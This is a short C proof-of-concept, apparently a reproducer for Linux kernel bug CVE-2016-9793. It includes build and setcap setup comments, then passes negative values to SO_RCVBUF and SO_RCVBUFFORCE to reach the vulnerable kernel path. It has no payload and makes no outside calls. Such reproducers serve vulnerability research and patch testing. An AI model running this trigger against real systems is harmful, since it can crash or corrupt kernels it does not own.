// apt update && apt install libcap2-bin gcc -y
// gcc cve-2016-9793.c -o cve-2016-9793
// chown guest:guest cve-2016-9793
// setcap cap_net_admin+ep ./cve-2016-9793

#include <sys/socket.h>
#include <stdio.h>

int main()
{
    int sock = socket(AF_INET, SOCK_STREAM, 0);

    int err, result, size = sizeof(int);
    getsockopt(sock, SOL_SOCKET, SO_RCVBUF, &result, &size);
    printf("before SO_RCVBUF: %d\n", result);

    printf("Trying to change SO_RCVBUF to 0 with SO_RCVBUF:\n");
    result = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &result, size);

    getsockopt(sock, SOL_SOCKET, SO_RCVBUF, &result, &size);
    printf("after SO_RCVBUF: %d\n", result);

    printf("Trying to change SO_RCVBUF to -1 with SO_RCVBUF:\n");
    result = -1;
    err = setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &result, size);
    if (err)
        printf("Bad\n");
    else
        printf("Ok\n");

    getsockopt(sock, SOL_SOCKET, SO_RCVBUF, &result, &size);
    printf("after SO_RCVBUF: %d\n", result);

    getchar();

    printf("Trying to change SO_RCVBUF to -1 with SO_RCVBUFFORCE:\n");
    result = -1;
    err = setsockopt(sock, SOL_SOCKET, SO_RCVBUFFORCE, &result, size);
    if (err)
        printf("Bad\n");
    else
        printf("Ok\n");

    getsockopt(sock, SOL_SOCKET, SO_RCVBUF, &result, &size);
    printf("after SO_RCVBUF: %d\n", result);
}
